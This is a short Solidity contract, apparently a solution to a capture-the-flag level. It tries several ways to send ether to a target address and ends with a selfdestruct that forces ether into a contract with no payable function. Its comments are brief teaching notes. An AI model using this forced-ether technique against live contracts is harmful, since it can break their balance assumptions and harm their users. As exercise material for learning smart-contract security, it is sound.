// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

contract HackForce {
    address payable private _forceAddress;

    constructor(address forceAddress) {
        _forceAddress = payable(forceAddress);
    }

    function sendEther() external payable {
        // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // 👉 2300 gas limit
        // 👉 return true if succeed - no exceptions are thrown
        require(_forceAddress.send(msg.value));
    }

    function transferEther() external payable {
        // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // 👉 2300 gas limit
        // 👉 throws exception
        _forceAddress.transfer(msg.value);
    }

    function callValueEther() external payable {
        // 📖 https://docs.soliditylang.org/en/v0.8.15/types.html#members-of-addresses
        // 👉 .gas() - gas limit
        // 👉 .value() - ether amount
        // 👉 return true if succeed - no exceptions are thrown
        (bool success, ) = _forceAddress.call{value: msg.value}("");
        require(success);
    }

    function selfDestructEther() external payable {
        // 📖 https://docs.soliditylang.org/en/develop/units-and-global-variables.html#contract-related
        selfdestruct(_forceAddress);
    }
}
